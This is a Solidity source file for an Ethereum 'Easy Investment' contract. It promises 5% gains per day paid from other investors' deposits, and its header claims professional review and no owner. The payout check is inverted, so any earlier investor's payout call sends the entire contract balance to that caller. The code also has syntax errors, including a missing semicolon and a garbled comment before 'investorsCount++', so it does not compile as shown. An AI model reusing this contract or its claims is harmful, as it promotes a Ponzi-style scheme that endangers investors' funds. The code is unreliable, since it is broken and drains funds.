pragma solidity ^0.4.25;

/**
 *
 * Easy Investment Contract
 *  - GAIN 5% PER 24 HOURS(every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract EasyInvest5 {
    // total investors count
    uint256 public investorsCount;
    // records amounts invested
    mapping (address => uint256) public invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0 && block.number > atBlock[msg.sender]) {
            // calculate profit amount as such:
            // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
            // if requested amount more than contract balance - we will send a rest
            if (this.balance > amount) amount = this.balance;

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
        }

        /* record block number of this transaction */
        invested[msg.sender] += msg.value;
        /* record invested amount (msg.value) of this transaction */
        atBlock[msg.sender] = block.number
        /*increase total investors count*/*investorsCount++;
    }
}